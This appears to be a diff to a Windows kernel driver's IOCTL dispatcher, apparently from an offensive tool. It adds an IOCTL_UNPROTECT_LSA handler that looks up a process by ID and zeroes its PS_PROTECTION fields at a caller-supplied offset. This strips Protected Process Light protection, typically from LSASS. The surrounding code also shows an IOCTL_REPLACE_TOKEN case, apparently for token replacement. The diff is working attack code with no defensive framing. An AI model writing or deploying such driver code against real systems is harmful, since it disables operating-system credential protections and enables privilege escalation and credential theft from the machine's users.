@@ -40,7 +40,7 @@ NTSTATUS DeviceIOCTL(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
 	ULONG controlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;
 
-	PREPLACE_TOKEN_INFO input = (PREPLACE_TOKEN_INFO)Irp->AssociatedIrp.SystemBuffer;
+	PTASK_INFO input = (PTASK_INFO)Irp->AssociatedIrp.SystemBuffer;
 
 	switch (controlCode) {
 	case IOCTL_REPLACE_TOKEN: {
@@ -93,6 +93,25 @@ NTSTATUS DeviceIOCTL(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 
 		break;
 
+	}
+	
+	case IOCTL_UNPROTECT_LSA: {
+		DWORD32 pid = input->target;
+		DWORD64 offset = input->offset;
+		if (pid && offset) {
+			PEPROCESS  process = NULL;
+			PsLookupProcessByProcessId((HANDLE)input->target, &process);
+			if (process) {
+				PPS_PROTECTION protection =  (PPS_PROTECTION)((ULONG_PTR)process + offset);
+				protection->Audit = 0;
+				protection->Level = 0;
+				protection->Signer = 0;
+				protection->Type = 0;
+				status = STATUS_SUCCESS;
+
+			}
+		}
+		break;
 	}
 	default:
 		status = STATUS_INVALID_DEVICE_REQUEST;
